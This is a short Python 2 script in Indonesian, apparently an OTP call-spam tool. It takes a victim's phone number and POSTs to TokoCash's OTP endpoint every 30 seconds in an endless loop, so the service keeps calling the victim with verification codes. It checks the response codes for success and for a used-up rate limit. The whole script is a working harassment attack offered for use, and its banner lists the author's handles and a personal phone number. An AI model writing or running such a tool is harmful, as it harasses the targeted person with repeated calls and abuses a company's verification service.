#!/usr/bin/python

import requests
import os
from os import system
from bs4 import BeautifulSoup
from time import sleep

os.system('clear')
print ('\n')
print ('#'*49)
print ('\n\tCreator         : Mr.009X')
print ('\tFacebook        : Yudha')
print ('\tWhatsapp        : 089692752789')
print ('\tInstagram       : 009_error')
print ('\tRilis           : 30-07-2019')
print ('\tYoutube Channel : Kameludin 06')
print ('\tAlamat          : Kabupaten Sambas\n')
print ('#'*49)
print ('\n')

nomor = raw_input('Masukkan nomor Target =  ')

print ('\n')
def spam():
	url1 = ('https://www.tokocash.com/oauth/otp')
	data = {"msisdn": nomor, "accept": "call"}
	headers = {"X-Requested-With": "XMLHttpRequest"}
	ses = requests .Session()
	post = ses.post(url1 ,data=data ,headers=headers)
	parsing = post.json()['code']
	if "500001" in parsing:
		print "[!]gagal"
	elif "412556" in parsing:
		print "[!]limit habis (coba lagi nanti)\n"
		exit()
	elif "400133" in parsing:
		print "nomor yang anda masukkan error"
		exit()
	else:
		print "[+]berhasil"

while True:
	spam()
	sleep(30)
